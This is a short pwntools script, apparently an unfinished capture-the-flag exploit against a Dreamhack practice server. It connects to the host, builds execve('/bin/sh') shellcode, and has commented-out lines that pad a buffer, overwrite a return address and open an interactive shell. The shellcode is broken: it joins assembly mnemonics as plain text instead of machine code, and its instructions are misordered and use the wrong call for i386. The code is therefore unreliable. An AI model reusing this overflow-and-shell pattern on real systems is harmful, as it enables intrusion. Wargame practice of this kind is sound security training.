from pwn import *

HOST = 'host3.dreamhack.games'
PORT = 15880

r = remote(HOST, PORT)

context.arch = 'i386'
context.endian = 'little'
context.log_level = 'debug'

print(r.recvline())


shellcode = b'mov eax, 0x6e2f7368'
shellcode += b'push eax'
shellcode += b'mov eax, 0x2f626900'
shellcode += b'mov ebx, esp'
shellcode += b'xor ecx, ecx'
shellcode += b'xor edx, edx'
shellcode += b'mov eax, 0x0b'
shellcode += b'syscall'

print(shellcode)
# payload = p32(shellcode)

# payload += b'A'*(0x80 - len(shellcode))
# payload += b'B'*0x04
# payload += p32(0xffffd1b8)

# r.sendline(payload)
# r.interactive()